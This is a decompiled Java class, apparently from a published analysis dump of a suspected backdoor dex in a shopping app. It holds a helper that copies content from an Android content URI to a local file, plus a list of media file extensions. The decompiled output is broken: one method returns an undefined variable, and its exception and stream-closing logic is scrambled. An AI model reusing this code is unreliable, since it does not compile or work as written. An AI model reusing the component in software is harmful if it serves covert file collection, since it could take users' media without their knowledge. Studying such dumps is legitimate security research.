package com.google.android.sd.biz_dynamic_dex.base;

import android.content.Context;
import android.net.Uri;
import android.os.ParcelFileDescriptor;
import java.io.Closeable;
import java.io.File;
import java.io.FileDescriptor;
import java.io.FileInputStream;
import java.io.FileOutputStream;

public final class b {
  private static final String[] a = new String[] { 
      ".wav", ".aif", ".au", ".mp3", ".ram", ".wma", ".mmf", ".amr", ".aac", ".flac", 
      ".avi", ".mpg", ".mov", ".swf", ".mp4", ".flv", ".bmp", ".gif", ".jpg", ".jpeg", 
      ".pic", ".png", ".tif", ".webp" };
  
  private static ParcelFileDescriptor a(Context paramContext, Uri paramUri, String paramString) {
    try {
      return paramContext.getContentResolver().openFileDescriptor(paramUri, paramString);
    } catch (Exception exception) {
      return null;
    } 
  }
  
  private static void a(ParcelFileDescriptor paramParcelFileDescriptor) {
    if (paramParcelFileDescriptor != null)
      try {
        paramParcelFileDescriptor.close();
        return;
      } catch (Exception exception) {
        return;
      }  
  }
  
  private static void a(Closeable paramCloseable) {
    if (paramCloseable != null)
      try {
        paramCloseable.close();
        return;
      } catch (Exception exception) {
        return;
      }  
  }
  
  public static boolean a(Context paramContext, Uri paramUri) {
    return (paramContext.checkCallingOrSelfUriPermission(paramUri, 3) == 0);
  }
  
  public static boolean a(Context paramContext, Uri paramUri, File paramFile) {
    Exception exception1;
    ParcelFileDescriptor parcelFileDescriptor = a(paramContext, paramUri, "r");
    if (parcelFileDescriptor == null)
      return false; 
    Exception exception3 = null;
    Exception exception2 = null;
    try {
      Exception exception4;
      Exception exception5;
      FileDescriptor fileDescriptor = parcelFileDescriptor.getFileDescriptor();
      if (fileDescriptor == null)
        return false; 
      FileInputStream fileInputStream = new FileInputStream(fileDescriptor);
      try {
        FileInputStream fileInputStream1;
        FileOutputStream fileOutputStream = new FileOutputStream(paramFile);
        try {
          return !!bool;
        } catch (Exception null) {
        
        } finally {
          exception2 = null;
          fileInputStream1 = fileInputStream;
        } 
        a(fileOutputStream);
        a(fileInputStream1);
        a(parcelFileDescriptor);
        throw exception4;
      } catch (Exception null) {
      
      } finally {
        exception3 = null;
        exception1 = exception2;
        exception5 = exception4;
      } 
      a((Closeable)exception1);
      a((Closeable)exception5);
      a(parcelFileDescriptor);
      throw exception4;
    } catch (Exception exception) {
    
    } finally {
      paramFile = null;
      exception1 = exception2;
      a((Closeable)exception1);
      a((Closeable)paramFile);
      a(parcelFileDescriptor);
    } 
    a((Closeable)exception1);
    a((Closeable)paramContext);
    a(parcelFileDescriptor);
    return false;
  }
  
  private static boolean a(FileInputStream paramFileInputStream, FileOutputStream paramFileOutputStream) {
    try {
      byte[] arrayOfByte = new byte[8192];
      while (true) {
        int i = paramFileInputStream.read(arrayOfByte);
        if (i > 0) {
          paramFileOutputStream.write(arrayOfByte, 0, i);
          continue;
        } 
        paramFileOutputStream.flush();
        return true;
      } 
    } catch (Exception exception) {
      return false;
    } 
  }
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\7877ec6850344e7aad5fdd57f6abf238-dex2jar.jar!\com\google\android\sd\biz_dynamic_dex\base\b.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */